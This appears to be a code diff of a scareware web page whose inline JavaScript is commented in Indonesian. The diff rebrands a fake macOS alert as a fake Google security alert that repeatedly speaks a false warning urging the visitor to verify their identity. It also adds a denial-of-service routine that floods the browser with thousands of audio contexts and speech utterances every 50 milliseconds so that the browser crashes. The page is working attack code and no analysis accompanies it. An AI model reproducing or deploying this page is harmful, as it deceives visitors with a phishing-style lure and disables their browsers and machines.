@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>macOS Security Alert</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
@@ -16,17 +16,17 @@
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY & MACOS TARGET
+  // KONFIGURASI AUTOPLAY
   // ============================================
   var CONFIG = {
     tts: {
-      text: "macOS Security Warning. Unauthorized access attempt detected on your system. Please verify your Apple ID immediately.",
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
-      rate: 0.9,
+      rate: 0.85,
       pitch: 1.0,
       volume: 1.0,
-      repeatInterval: 7000,
-      maxRepeats: 25
+      repeatInterval: 8000,
+      maxRepeats: 20
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
@@ -34,7 +34,7 @@
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // TTS LOOP (macOS Speech Synthesis)
+  // TTS — TANPA CANCEL DI DALAM LOOP
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -51,6 +51,8 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -59,7 +61,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) {}
+    } catch (e) { console.log('[TTS] fail:', e.message); }
   }
 
   function startTTS() {
@@ -70,13 +72,13 @@
   }
 
   // ============================================
-  // AUDIO CONTEXT UNLOCK (Desktop Safari/Chrome)
+  // AUDIO CONTEXT UNLOCK
   // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -103,7 +105,7 @@
   }
 
   // ============================================
-  // MAIN AUDIO (Web Audio API - Desktop Alert Tone)
+  // MAIN AUDIO (Web Audio API)
   // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
@@ -112,15 +114,15 @@
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       var sr = ctx.sampleRate;
-      var dur = 2.5;
+      var dur = 3.0;
       var buf = ctx.createBuffer(1, sr * dur, sr);
       var d = buf.getChannelData(0);
 
       for (var i = 0; i < d.length; i++) {
         var t = i / sr;
-        var freq = 900 + (Math.floor(t * 6) % 2) * 450;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
         var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.25 * env;
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
       }
 
       var src = ctx.createBufferSource();
@@ -128,35 +130,37 @@
       src.connect(ctx.destination);
       src.start();
       src.onended = startTTS;
-      setTimeout(startTTS, 3000);
+      setTimeout(startTTS, 3500);
     } catch (e) {
       startTTS();
     }
   }
 
   // ============================================
-  // DESKTOP RESOURCE EXHAUSTION / DOS (macOS Renderer)
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
   // ============================================
-  function triggerMacResourceExhaustion() {
-    console.log("[!] Initiating macOS Desktop DoS Trigger...");
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
     
-    // Membebani Audio Engine & Speech Queue khusus Safari/Chrome macOS
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
       try {
-        for (var i = 0; i < 1500; i++) {
+        for (var i = 0; i < 2000; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
           
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
           
-          var u = new SpeechSynthesisUtterance("MACOS_DOS_" + i);
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
           window.speechSynthesis.speak(u);
         }
       } catch(e) {}
-    }, 60);
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
   }
 
   // ============================================
@@ -167,48 +171,38 @@
 
   setTimeout(function () {
     unlockAudioContext();
-    startTTS();
+    startTTS(); // coba TTS lebih awal
   }, 100);
 
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
-  }, 400);
+  }, 500);
 
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
     
-    // PANGGIL EXHAUSTION TRIGGER
-    triggerMacResourceExhaustion();
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
     
-  }, 1200);
+  }, 1500);
 
-  // Retry handler
+  // Retry jika audio diblokir
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
     unlockAudioContext();
     trySilentAudio();
     if (!state.ttsStarted) startTTS();
-    if (retryCount > 8) clearInterval(retry);
+    if (retryCount > 10) clearInterval(retry);
   }, 2000);
 
-  // Visibility change handler
+  // Visibility change
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden && !state.mainPlayed) {
       setTimeout(playMainAudio, 100);
     }
   });
-
-  // ============================================
-  // REDIRECT KE GOOGLE (300ms DELAY)
-  // ============================================
-  setTimeout(function() {
-    try {
-      window.location.replace('https://www.google.com');
-    } catch(e) {}
-  }, 300);
-
 })();
 </script>
 </body>
